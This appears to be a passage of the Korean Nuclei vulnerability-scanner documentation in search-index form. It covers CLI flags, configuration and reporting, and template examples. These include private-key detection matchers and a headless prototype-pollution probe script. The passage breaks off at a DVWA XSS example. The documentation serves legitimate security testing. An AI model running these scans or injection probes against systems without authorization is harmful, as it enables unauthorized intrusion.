h1/geekboy' - 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' CLI \ud50c\ub798\uadf8\ub97c \uc774\uc6a9\ud55c \uc0ac\uc6a9\uc790 \uc815\uc758 \ud5e4\ub354 \uc124\uc815 nuclei -header 'User-Agent : Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' -list urls.txt -tags cves","title":"Traffic Tagging"},{"location":"kr/nuclei/get-started/#_2","text":"Nuclei\ub294 \uc2e4\ud589\uc5d0 \ud3ec\ud568\ud560 \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678/\ubc29\uc9c0 \ud558\ub294 \ub2e4\uc591\ud55c \ubc29\ubc95\uc744 \uc81c\uacf5\ud569\ub2c8\ub2e4. \uc2a4\uce94\uc73c\ub85c \uc778\ud55c \uc608\uce21\ub418\uc9c0 \uc54a\uc740 \ud37c\uc988\ub97c \ud53c\ud558\uace0, \ub300\ub7c9 \uc2a4\uce94\uc5d0\uc11c \uc77c\ubd80 \uc81c\uc678\ub97c \uc704\ud574 \uc2e4\ud589\ub418\uc9c0 \uc54a\uc544\uc57c \ud558\ub294 \ud0dc\uadf8\ub4e4\uacfc \ud15c\ud50c\ub9bf\ub4e4\uc744 Nuclei\uc5d0\uc11c\ub294 \uae30\ubcf8\uc801\uc73c\ub85c \uc81c\uc678\ud569\ub2c8\ub2e4. \uae30\ubcf8 \uc81c\uc678 \ubaa9\ub85d\uc740 \uc544\ub798\uc758 \ub9c1\ud06c\ub97c \ud1b5\ud574 \ud655\uc778 \uac00\ub2a5\ud569\ub2c8\ub2e4. \uc774 \ud30c\uc77c\uc740 \uc124\uc815 \ud30c\uc77c \ud639\uc740 \ud50c\ub798\uadf8\ub4e4\uc744 \ud1b5\ud574 \uc27d\uac8c \uace0\uce60 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uae30\ubcf8 \uc81c\uc678 \ubaa9\ub85d: Template ignore nuclei-ignore \ud30c\uc77c\uc740 \uc0ac\uc6a9\uc790\uac00 \uc5c5\ub370\uc774\ud2b8/\ud3b8\uc9d1/\uc81c\uac70\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4. \uc774\ub97c \ub36e\uc5b4\uc4f0\uae30 \uc704\ud574\uc11c\ub294 nuclei configuration \ud30c\uc77c\uc744 \uc774\uc6a9\ud569\ub2c8\ub2e4. Nuclei\ub294 \ub450 \uac00\uc9c0 \ubc29\ubc95\uc744 \ud1b5\ud574 \uc2a4\uce94\uc5d0\uc11c \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf\uc744 \uc870\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Exclude Templates ( -exclude-templates/exclude ) \ud15c\ud50c\ub9bf \uc81c\uc678\ud558\uae30 ( -exclude-templates/exclude ) exclude-templates \ud50c\ub798\uadf8\ub294 \ud558\ub098 \ud639\uc740 \ub2e4\uc218\uc758 \ud15c\ud50c\ub9bf \uadf8\ub9ac\uace0 \ub514\ub809\ud1a0\ub9ac\ub97c \uc81c\uc678\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ubcf5\uc218\uc758 -exclude-templates \ud50c\ub798\uadf8\ub97c \ud1b5\ud574 \uc5ec\ub7ec \uac12\uc744 \uc81c\uacf5\ud569\ub2c8\ub2e4. Exclude Tags ( -exclude-tags/etags ) \ud0dc\uadf8 \uc81c\uc678\ud558\uae30 ( -exclude-tags/etags ) exclude-tags \ud50c\ub798\uadf8\ub294 \uc815\uc758\ub41c \ud0dc\uadf8\ub4e4\uc744 \uae30\ubc18\uc73c\ub85c \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678\ud569\ub2c8\ub2e4. \ud558\ub098 \ud639\uc740 \ub2e4\uc218\uc758 \ud0dc\uadf8\ub97c \uc0ac\uc6a9\ud574 \uc81c\uc678\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud558\ub098\uc758 \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678\ud558\ub294 \uc608 nuclei -list urls.txt -t cves/ -exclude-templates cves/2020/CVE-2020-XXXX.yaml \ub2e4\uc218\uc758 \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678\ud558\ub294 \uc608 nuclei -list urls.txt -exclude-templates exposed-panels/ -exclude-templates technologies/ \ud558\ub098\uc758 \ud0dc\uadf8\ub85c \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678\ud558\ub294 \uc608 nuclei -l urls.txt -t cves/ -etags xss \ub2e4\uc218\uc758 \ud0dc\uadf8\ub97c \uc774\uc6a9\ud574 \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678\ud558\ub294 \uc608 nuclei -l urls.txt -t cves/ -etags sqli,rce nuclei-ignore \ub97c \uc27d\uac8c \uc124\uc815\ud558\uae30 \uc704\ud574 Nuclei\ub294 include-tags / include-templates \ud50c\ub798\uadf8\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc81c\uc678\ub41c \ud0dc\uadf8\ub4e4\uc744 \uc2e4\ud589\ud558\ub294 \uc608 nuclei -l urls.txt -include-tags iot,misc,fuzz \ubaa8\ub4e0 \uac80\uc0c9\uc5d0 \ub300\ud574 \uc774\ub7ec\ud55c \ud0dc\uadf8\ub97c \ud3ec\ud568\ud558\ub3c4\ub85d nuclei \uc124\uc815 \ud30c\uc77c\uc744 \uc5c5\ub370\uc774\ud2b8\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4.","title":"\ud15c\ud50c\ub9bf \uc81c\uc678"},{"location":"kr/nuclei/get-started/#nuclei_6","text":"v.2.3.2 \ubc84\uc804\uc758 nuclei\ubd80\ud130 \uae54\ub054\ud55c CLI \ud658\uacbd\uacfc \ud3ec\ub9f7\ud305\ub41c \uae38\uac70\ub098 \uc9e7\uc740 \ud615\uc2dd\uc758 \ud50c\ub798\uadf8\ub4e4\uc744 \uc0ac\uc6a9\ud558\uae30 \uc704\ud574\uc11c goflags \ub97c \uc0ac\uc6a9\ud569\ub2c8\ub2e4. \uc790\ub3d9 \uc0dd\uc131 \uc124\uc815 \ud30c\uc77c\uc744 \uc0dd\uc131\ud558\ub294 goflags \ub294 \uc0ac\uc6a9 \uac00\ub2a5\ud55c \ubaa8\ub4e0 CLI\ud50c\ub798\uadf8\ub97c \uc124\uc815 \ud30c\uc77c\ub85c \ucee4\ubc84\ud569\ub2c8\ub2e4. \uae30\ubcf8\uc801\uc73c\ub85c \ub85c\ub4dc\ub418\ub294 \ubc18\ubcf5\uc801\uc778 CLI \ud50c\ub798\uadf8\ub97c \ud53c\ud558\uae30 \uc704\ud574\uc11c \ubaa8\ub4e0 CLI \ud50c\ub798\uadf8\ub4e4\uc744 \uc124\uc815 \ud30c\uc77c\uc5d0 \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Nuclei \uc124\uc815 \ud30c\uc77c\uc758 \uae30\ubcf8 \uacbd\ub85c\ub294 $HOME/.config/nuclei/config.yaml \uc785\ub2c8\ub2e4. \uae30\ubcf8\uc801\uc73c\ub85c \uc2e4\ud589\ud560 \ud50c\ub798\uadf8\ub97c \uc124\uc815\ud558\uac70\ub098 \uc8fc\uc11d \ud574\uc81c\ud569\ub2c8\ub2e4. \uc544\ub798\ub294 \uc124\uc815 \ud30c\uc77c\uc758 \uc608\uc2dc\uc785\ub2c8\ub2e4. # Headers to include with all HTTP request header : - 'X-BugBounty-Hacker: h1/geekboy' # Directory based template execution templates : - cves/ - vulnerabilities/ - misconfiguration/ # Tags based template execution tags : exposures,cve # Template Filters tags : exposures,cve author : geeknik,pikpikcu,dhiyaneshdk severity : critical,high,medium # Template Allowlist include-tags : dos,fuzz # Tag based inclusion (allows overwriting nuclei-ignore list) include-templates : # Template based inclusion (allows overwriting nuclei-ignore list) - vulnerabilities/xxx - misconfiguration/xxxx # Template Denylist exclude-tags : info # Tag based exclusion exclude-templates : # Template based exclusion - vulnerabilities/xxx - misconfiguration/xxxx # Rate Limit configuration rate-limit : 500 bulk-size : 50 concurrency : 50 \uc77c\ub2e8 \uc124\uc815\uc774 \ub418\uba74, \uc124\uc815 \ud30c\uc77c\uc744 \uae30\ubcf8\uc801\uc73c\ub85c \uc0ac\uc6a9\ud569\ub2c8\ub2e4. -config \ud50c\ub798\uadf8\ub97c \ud1b5\ud574 \uc0ac\uc6a9\uc790 \uc815\uc758 \uc124\uc815 \ud30c\uc77c\uc744 \ucd94\uac00\uc801\uc73c\ub85c \uc81c\uacf5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc0ac\uc6a9\uc790 \uc815\uc758 \ud30c\uc77c\ub85c nuclei \uc2e4\ud589\ud558\uae30 nuclei -config project.yaml -list urls.txt","title":"Nuclei \uc124\uc815"},{"location":"kr/nuclei/get-started/#nuclei_7","text":"Nuclei\ub294 GitHub, GitLab, Jira integration \uc744 \uc9c0\uc6d0\ud558\ub294 v2.3.0 \ubc84\uc804\uacfc \ud568\uaed8 \uc2e0\uace0 \ubaa8\ub4c8\uc744 \uc81c\uacf5\ud569\ub2c8\ub2e4. \uc774\ub294 \ubc1c\uacac\ub41c \uacb0\uacfc\uc5d0 \ub530\ub77c \uc9c0\uc6d0\ub418\ub294 \ud50c\ub7ab\ud3fc\uc5d0\uc11c \uc790\ub3d9\uc73c\ub85c \uc2e0\uace0 \ub0b4\uc5ed\uc744 \uc0dd\uc131\ud560 \uc218 \uc788\uac8c \ud574\uc90d\ub2c8\ub2e4. Platform GitHub GitLab Jira Markdown SARIF Elasticsearch Support -rc, -report-config \ud50c\ub798\uadf8\ub294 \ud1b5\ud569\uc744 \uc704\ud574 \ud50c\ub7ab\ud3fc\uc758 \uc138\ubd80 \uc815\ubcf4\ub97c \uc77d\uae30 \uc704\ud574 \uc124\uc815 \ud30c\uc77c\uc744 \uc81c\uacf5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc9c0\uc6d0\ub418\ub294 \ubaa8\ub4e0 \ud50c\ub7ab\ud3fc\uc5d0 \ub300\ud55c \uc608\uc2dc \ud30c\uc77c \uc785\ub2c8\ub2e4. \uc608\ub97c \ub4e4\uc5b4, Github \uc5d0\uc11c \uc2e0\uace0 \ub0b4\uc5ed\uc744 \uc0dd\uc131\ud558\uae30 \uc704\ud574 \ub2e4\uc74c\uc758 \ub0b4\uc6a9\uc744 \ub2f4\uc740 \uc124\uc815 \ud30c\uc77c\uc744 \uc0dd\uc131\ud558\uace0 \uc801\uc808\ud55c \uac12\ub4e4\uc744 \ubc14\uafb8\uc5b4 \ubd05\ub2c8\ub2e4. # GitHub contains configuration options for GitHub issue tracker github : username : \"$user\" owner : \"$user\" token : \"$token\" project-name : \"testing-project\" issue-label : \"Nuclei\" Elasticsearch\uc758 \uacb0\uacfc\ub4e4\uc744 \uc800\uc7a5\ud558\uae30 \uc704\ud574 \ub2e4\uc74c\uc758 \ub0b4\uc6a9\uc744 \ub2f4\uc740 \uc124\uc815 \ud30c\uc77c\uc744 \uc0dd\uc131\ud558\uace0 \uc801\uc808\ud55c \uac12\ub4e4\uc744 \ubc14\uafb8\uc5b4 \ubd05\ub2c8\ub2e4. # elasticsearch contains configuration options for elasticsearch exporter elasticsearch : # IP for elasticsearch instance ip : 127.0.0.1 # Port is the port of elasticsearch instance port : 9200 # IndexName is the name of the elasticsearch index index-name : nuclei \uc2e0\uace0 \ubaa8\ub4c8\uacfc \ud568\uaed8 Nuclei \uc2e4\ud589\ud558\uae30 nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml \ube44\uc2b7\ud558\uac8c \ub2e4\ub978 \ud50c\ub7ab\ud3fc\ub4e4\ub3c4 \uc124\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc2e0\uace0 \ubaa8\ub4c8\uc740 \uc911\ubcf5\ub418\ub294 \uc2e0\uace0 \ub0b4\uc5ed\uc744 \uc0dd\uc131\ud558\uc9c0 \uc54a\uae30 \uc704\ud574\uc11c \uae30\ubcf8\uc801\uc778 \ud544\ud130\ub9c1\uacfc \uc911\ubcf5 \uccb4\ud06c\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. allow-list : severity : high,critical \uc704\ub294 \uc2ec\uac01\ub3c4\uac00 high \uc774\uace0 critical \ub85c \uc2dd\ubcc4\ub418\ub294 \uc774\uc288\ub4e4\uc5d0 \ub300\ud574\uc11c\ub9cc \uc2e0\uace0 \ub0b4\uc5ed\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. \ube44\uc2b7\ud558\uac8c\ub3c4 deny-list \uc124\uc815\uc740 \ud2b9\uc815 \uc2ec\uac01\ub3c4\uc758 \uc774\uc288\ub4e4\uc744 \uc81c\uc678\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uac19\uc740 \uc5d0\uc14b\uc5d0 \ub300\ud574 \uc8fc\uae30\uc801\uc778 \uc2a4\uce94\uc744 \uc2e4\ud589\ud55c\ub2e4\uba74, \uc2e0\uace0 \ubaa8\ub4c8\uc774 \ube44\uad50\ud558\uace0 \uc720\ub2c8\ud06c\ud55c \uc774\uc288\ub4e4\uc5d0 \ub300\ud55c \uc2e0\uace0 \ub0b4\uc5ed\uc744 \uc0dd\uc131 \ud558\ub294 \uc8fc\uc5b4\uc9c4 \ub514\ub809\ud1a0\ub9ac\uc5d0\uc11c\uc758 \uc720\ud6a8\ud55c \ubc1c\uacac\uc5d0 \ub300\ud574\uc11c \ub85c\uceec \ubcf5\uc0ac\ubcf8\uc744 \uc0dd\uc131\ud558\ub294 -rdb, -report-db \ud50c\ub798\uadf8\ub97c \uace0\ub824\ud574\ubcfc \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml -rdb prod Markdown \ucd94\ucd9c Nuclei\ub294 -me, -markdown-export \ud50c\ub798\uadf8\ub97c \ud1b5\ud574 \uc720\ud6a8\ud55c \ubc1c\uacac\ub4e4\uc744 \ub9c8\ud06c\ub2e4\uc6b4 \ud615\uc2dd\uc73c\ub85c \ucd94\ucd9c\ud558\ub294 \uac83\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc774 \ud50c\ub798\uadf8\ub294 \ub9c8\ud06c\ub2e4\uc6b4 \ud615\uc2dd\uc758 \uacb0\uacfc\ub97c \uc800\uc7a5\ud558\uae30 \uc704\ud574 \uc785\ub825\uc73c\ub85c \ub514\ub809\ud1a0\ub9ac\ub97c \uc0ac\uc6a9\ud569\ub2c8\ub2e4. \ub9c8\ud06c\ub2e4\uc6b4 \ud615\uc2dd\uc758 \uacb0\uacfc\uc5d0\uc11c \uc694\uccad/\uc751\ub2f5\uc744 \ud3ec\ud568\ud558\ub294 \uac83\uc740 \uc120\ud0dd \uc0ac\ud56d\uc785\ub2c8\ub2e4. \ud639\uc740 -irr, -include-rr \ud50c\ub798\uadf8\uac00 -me \uc640 \ud568\uaed8 \uc0ac\uc6a9\ub420 \ub54c \ud3ec\ud568\ub429\ub2c8\ub2e4. nuclei -l urls.txt -t cves/ -irr -markdown-export reports SARIF \ucd94\ucd9c Nuclei\ub294 -se, -sarif-export \ud50c\ub798\uadf8\ub97c \ud1b5\ud574 \uc720\ud6a8\ud55c \ubc1c\uacac\ub4e4\uc744 SARIF \ud615\uc2dd\uc73c\ub85c \ucd94\ucd9c\ud558\ub294 \uac83\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc774 \ud50c\ub798\uadf8\ub294 SARIF \ud615\uc2dd\uc758 \uacb0\uacfc\ub97c \uc800\uc7a5\ud558\uae30 \uc704\ud574 \uc785\ub825\uc73c\ub85c \ud30c\uc77c\uc744 \uc0ac\uc6a9\ud569\ub2c8\ub2e4. \uc694\uccad-\uc751\ub2f5 \uc815\ubcf4\ub294 \ub9c8\ud06c\ub2e4\uc6b4 \ubb38\ubc95 \ud615\uc2dd\uc774\uace0, SARIF\uc758 \uc751\ub2f5 \uc601\uc5ed\uc5d0 \uc800\uc7a5\ub429\ub2c8\ub2e4. nuclei -l urls.txt -t cves/ -sarif-export report.sarif","title":"Nuclei \uc2e0\uace0"},{"location":"kr/nuclei/get-started/#scan-metrics","text":"Nuclei\ub294 localhost:9092/metrics \uc5d0 \uc811\uc18d \uac00\ub2a5\ud558\uba70 -metrics \ud50c\ub798\uadf8\ub97c \uc0ac\uc6a9\ud558\uba74 \ub85c\uceec \ud3ec\ud2b8 9092 \uc5d0\uc11c \uc2e4\ud589 \uc911\uc778 scan metrics\ub97c \ubcfc \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uae30\ubcf8 \ud3ec\ud2b8\ub294 -metrics-port \ud50c\ub798\uadf8\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc124\uc815 \ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -t cves/ -l urls.txt -metrics \ub85c nuclei\uac00 \uc2e4\ud589\ub41c \ub3d9\uc548 metrics \ub85c \uc751\ub2f5\uc744 \uc694\uccad\ud55c \uc608\uc2dc\uc785\ub2c8\ub2e4. curl -s localhost:9092/metrics | jq . { \"duration\" : \"0:00:03\" , \"errors\" : \"2\" , \"hosts\" : \"1\" , \"matched\" : \"0\" , \"percent\" : \"99\" , \"requests\" : \"350\" , \"rps\" : \"132\" , \"startedAt\" : \"2021-03-27T18:02:18.886745+05:30\" , \"templates\" : \"256\" , \"total\" : \"352\" }","title":"Scan Metrics"},{"location":"kr/nuclei/get-started/#passive-scan","text":"Nuclei\ub294 \ud30c\uc77c \uc9c0\uc6d0\uc744 \ud1b5\ud574 HTTP \uae30\ubc18 \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \uc218\ub3d9 \ubaa8\ub4dc \uc2a4\uce94\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc774 \uae30\ub2a5\uc744 \ud1b5\ud574 \ub2e4\ub978 \ub3c4\uad6c\uc5d0\uc11c \uc218\uc9d1\ub41c \ub85c\uceec\uc5d0 \uc800\uc7a5\ub41c HTTP \uc751\ub2f5 \ub370\uc774\ud130\uc5d0 \ub300\ud574 HTTP \uae30\ubc18 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -passive -target http_data \uc218\ub3d9\ubaa8\ub4dc\ub294 {{BasedURL}} \ud639\uc740 {{BasedURL/}} \uc744 \uae30\ubcf8 \uacbd\ub85c\ub85c \uac00\uc9c0\ub294 \ud15c\ud50c\ub9bf\ub4e4\uc5d0 \ub300\ud574 \uc81c\ud55c\ub429\ub2c8\ub2e4.","title":"Passive Scan"},{"location":"kr/nuclei/get-started/#_3","text":"Nuclei templates \ub294 nuclei \ud504\ub85c\uc81d\ud2b8\uc758 \uae30\ubc18\uc785\ub2c8\ub2e4. \uc774 \ud504\ub85c\uc81d\ud2b8\ub97c \uc704\ud574 \uc0c8\ub85c\uc6b4 \ud0ec\ud50c\ub9bf\uc744 \uc791\uc131\ud558\uac70\ub098 \uc81c\ucd9c\ud574\uc8fc\uc2dc\ub294 \ubd84\uaed8 \uac10\uc0ac\ub4dc\ub9bd\ub2c8\ub2e4. \uadf8\ub9ac\uace0 \uc774\ub7ec\ud55c \uae30\uc5ec\ub294 \uc800\ud76c\uac00 \ud504\ub85c\uc81d\ud2b8\ub97c \uacc4\uc18d \uc9c0\uc18d\ud560 \ud070 \ub3d9\uae30\uac00 \ub429\ub2c8\ub2e4.","title":"\uae30\uc5ec"},{"location":"kr/nuclei/get-started/#license","text":"Nuclei is distributed under MIT License .","title":"License"},{"location":"kr/template-examples/dns/","text":"\uae30\ubcf8 \ud15c\ud50c\ub9bf \u00b6 \uc785\ub825\uc5d0 \ub300\ud55c CNAME \ub808\ucf54\ub4dc\uac00 \uc874\uc7ac\ud558\ub294\uc9c0 \uac10\uc9c0\ud558\uae30 \uc704\ud55c \uae30\ubcf8\uc801\uc778 DNS \uc694\uccad\uc785\ub2c8\ub2e4. id : basic-dns-example info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 3 matchers : - type : word words : # \uc751\ub2f5\uc740 CNAME \ub808\ucf54\ub4dc\ub97c \ubc18\ub4dc\uc2dc \ud3ec\ud568\ud574\uc57c \ud569\ub2c8\ub2e4. - \"IN\\tCNAME\" Multiple matcher \u00b6 zendesk.com \ub610\ub294 github.io\uc744 \uac00\ub9ac\ud0a4\ub294 CNAME \ub808\ucf54\ub4dc\ub85c \uc11c\ube0c\ub3c4\uba54\uc778\uc744 \ud0d0\uc9c0\ud560 \uc218 \uc788\ub294 \uc5ec\ub7ec Matcher\ub4e4\uc744 \ubcf4\uc5ec\uc8fc\ub294 \uc608\uc2dc\uc785\ub2c8\ub2e4. id : multiple-matcher info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 5 matchers-condition : or matchers : - type : word name : zendesk words : - \"zendesk.com\" - type : word name : github words : - \"github.io\"","title":"Dns"},{"location":"kr/template-examples/dns/#_1","text":"\uc785\ub825\uc5d0 \ub300\ud55c CNAME \ub808\ucf54\ub4dc\uac00 \uc874\uc7ac\ud558\ub294\uc9c0 \uac10\uc9c0\ud558\uae30 \uc704\ud55c \uae30\ubcf8\uc801\uc778 DNS \uc694\uccad\uc785\ub2c8\ub2e4. id : basic-dns-example info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 3 matchers : - type : word words : # \uc751\ub2f5\uc740 CNAME \ub808\ucf54\ub4dc\ub97c \ubc18\ub4dc\uc2dc \ud3ec\ud568\ud574\uc57c \ud569\ub2c8\ub2e4. - \"IN\\tCNAME\"","title":"\uae30\ubcf8 \ud15c\ud50c\ub9bf"},{"location":"kr/template-examples/dns/#multiple-matcher","text":"zendesk.com \ub610\ub294 github.io\uc744 \uac00\ub9ac\ud0a4\ub294 CNAME \ub808\ucf54\ub4dc\ub85c \uc11c\ube0c\ub3c4\uba54\uc778\uc744 \ud0d0\uc9c0\ud560 \uc218 \uc788\ub294 \uc5ec\ub7ec Matcher\ub4e4\uc744 \ubcf4\uc5ec\uc8fc\ub294 \uc608\uc2dc\uc785\ub2c8\ub2e4. id : multiple-matcher info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 5 matchers-condition : or matchers : - type : word name : zendesk words : - \"zendesk.com\" - type : word name : github words : - \"github.io\"","title":"Multiple matcher"},{"location":"kr/template-examples/file/","text":"\uae30\ubcf8 \ud30c\uc77c \ud15c\ud50c\ub9bf \u00b6 \uc81c\uacf5\ub41c \ud30c\uc77c\uc5d0\uc11c \ud328\ud134 \uccb4\ud06c\ub97c \ud558\ub294 \ud15c\ud50c\ub9bf\uc785\ub2c8\ub2e4. id : ssh-public-key info : name : SSH Public Key Detect author : pd-team severity : low file : - extensions : - pub max-size : 1024 # read very small chunks matchers : - type : word words : - \"ssh-rsa\" \ube44\uc7ac\uadc0, \uc81c\uc678 \ubaa9\ub85d \ud655\uc7a5 \u00b6 \uc544\ub798\uc758 \ud15c\ud50c\ub9bf\uc740 \uc704\uc758 \ud15c\ud50c\ub9bf\uacfc \ub3d9\uc77c\ud569\ub2c8\ub2e4. \ud558\uc9c0\ub9cc, \ube44\uc7ac\uadc0 \uc635\uc158\uacfc \ud568\uaed8 \uc81c\uc678 \ubaa9\ub85d\uc744 \uc0ac\uc6a9\ud558\uace0 \uc788\uc2b5\ub2c8\ub2e4. id : ssh-private-key info : name : SSH Private Key Detect author : pd-team severity : high file : - extensions : - all denylist : - pub no-recursive : true max-size : 1024 # read very small chunks matchers : - type : word words : - \"BEGIN OPENSSH PRIVATE KEY\" - \"BEGIN PRIVATE KEY\" - \"BEGIN RSA PRIVATE KEY\" - \"BEGIN DSA PRIVATE KEY\" - \"BEGIN EC PRIVATE KEY\" - \"BEGIN PGP PRIVATE KEY BLOCK\" - \"ssh-rsa\"","title":"File"},{"location":"kr/template-examples/file/#_1","text":"\uc81c\uacf5\ub41c \ud30c\uc77c\uc5d0\uc11c \ud328\ud134 \uccb4\ud06c\ub97c \ud558\ub294 \ud15c\ud50c\ub9bf\uc785\ub2c8\ub2e4. id : ssh-public-key info : name : SSH Public Key Detect author : pd-team severity : low file : - extensions : - pub max-size : 1024 # read very small chunks matchers : - type : word words : - \"ssh-rsa\"","title":"\uae30\ubcf8 \ud30c\uc77c \ud15c\ud50c\ub9bf"},{"location":"kr/template-examples/file/#_2","text":"\uc544\ub798\uc758 \ud15c\ud50c\ub9bf\uc740 \uc704\uc758 \ud15c\ud50c\ub9bf\uacfc \ub3d9\uc77c\ud569\ub2c8\ub2e4. \ud558\uc9c0\ub9cc, \ube44\uc7ac\uadc0 \uc635\uc158\uacfc \ud568\uaed8 \uc81c\uc678 \ubaa9\ub85d\uc744 \uc0ac\uc6a9\ud558\uace0 \uc788\uc2b5\ub2c8\ub2e4. id : ssh-private-key info : name : SSH Private Key Detect author : pd-team severity : high file : - extensions : - all denylist : - pub no-recursive : true max-size : 1024 # read very small chunks matchers : - type : word words : - \"BEGIN OPENSSH PRIVATE KEY\" - \"BEGIN PRIVATE KEY\" - \"BEGIN RSA PRIVATE KEY\" - \"BEGIN DSA PRIVATE KEY\" - \"BEGIN EC PRIVATE KEY\" - \"BEGIN PGP PRIVATE KEY BLOCK\" - \"ssh-rsa\"","title":"\ube44\uc7ac\uadc0, \uc81c\uc678 \ubaa9\ub85d \ud655\uc7a5"},{"location":"kr/template-examples/headless/","text":"\uae30\ubcf8 \ud5e4\ub4dc\ub9ac\uc2a4 \ud0d0\uc0c9 \uc608\uc2dc \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 \ud5e4\ub4dc\ub9ac\uc2a4 \ube0c\ub77c\uc6b0\uc800\uc758 URL\uc744 \ubc29\ubb38\ud558\uc5ec \ub85c\ub4dc\ub420 \ub54c\uae4c\uc9c0 \uae30\ub2e4\ub9bd\ub2c8\ub2e4. id : basic-headless-request info : name : Basic Headless Request author : pdteam severity : info headless : - steps : - action : navigate args : url : \"{{BaseURL}}\" - action : waitload \ud5e4\ub4dc\ub9ac\uc2a4 \ud504\ub85c\ud1a0\ud0c0\uc785 \uc624\uc5fc \uac10\uc9c0 \u00b6 \uc544\ub798 \ud15c\ud50c\ub9bf\uc740 Nuclei \ud5e4\ub4dc\ub9ac\uc2a4 \uae30\ub2a5\uc774 \uc788\ub294 \ud398\uc774\uc9c0\uc5d0\uc11c \ud504\ub85c\ud1a0\ud0c0\uc785 \uc624\uc5fc\uc744 \uac10\uc9c0\ud569\ub2c8\ub2e4. \ud0d0\uc9c0\ub97c \uc704\ud55c \ucf54\ub4dc\ub294 https://github.com/msrkp/PPScan \uc5d0\uc11c \uac00\uc838\uc654\uc2b5\ub2c8\ub2e4. \uc6b0\ub9ac\ub294 \ud575\uc758 \uc2a4\ud06c\ub9bd\ud2b8 \uc8fc\uc785 \uae30\ub2a5\uc744 \uc0ac\uc6a9\ud558\uc5ec \ud504\ub85c\ud1a0\ud0c0\uc785 \uc624\uc5fc\uc5d0 \ub300\ud55c \uc2e0\ub8b0\ud560 \uc218 \uc788\ub294 \ud0d0\uc9c0\ub97c \uc81c\uacf5\ud569\ub2c8\ub2e4. id : prototype-pollution-check info : name : Prototype Pollution Check author : pd-team severity : medium reference : https://github.com/msrkp/PPScan headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : setheader args : part : response key : X-Frame-Options value : foo - action : setheader args : part : response key : If-None-Match value : foo # Set the hook to override window.data for xss detection - action : script args : hook : true code : | // Hooking code adapted from https://github.com/msrkp/PPScan/blob/main/scripts/content_script.js (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function check() { loc = location.href; if (loc.indexOf(\"e32a5ec9c99\") >= 0 && loc.search(\"a0def12bce\") == -1) { setTimeout(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\") { logger(location.href); } var url = new URL(location.origin + location.pathname); url.hash = \"__proto__[a0def12bce]=ddcb362f1d60&__proto__.a0def12bce=ddcb362f1d60&dummy\"; location = url.href; }, 5 * 1000); } else if (loc.search(\"a0def12bce\") != -1) { setTimeout(function() { if (Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } window.close(); }, 5 * 1000); } else { var url = new URL(loc); url.searchParams.append(\"__proto__[e32a5ec9c99]\", \"ddcb362f1d60\"); url.searchParams.append(\"__proto__.e32a5ec9c99\", \"ddcb362f1d60\"); location = url.href; } } window.onload = function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } else { check(); } }; var timerID = setInterval(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); clearInterval(timerID); } }, 5 * 1000)})(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"__proto__\" extractors : - type : kval part : alerts kval : - alerts \ud5e4\ub4dc\ub9ac\uc2a4 \ubaa8\ub4dc\ub85c DVWA XSS \uc7ac\ud604 \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 DVWA(Damn Vulnerable Web App)\uc5d0 \ub85c\uadf8\uc778\ud558\uace0 Reflected XSS\ub97c \uc790\ub3d9\uc73c\ub85c \uc7ac\ud604\ud558\ub824\uace0 \uc2dc\ub3c4\ud558\uba70 \ud398\uc774\ub85c\ub4dc\uac00 \uc131\uacf5\uc801\uc73c\ub85c 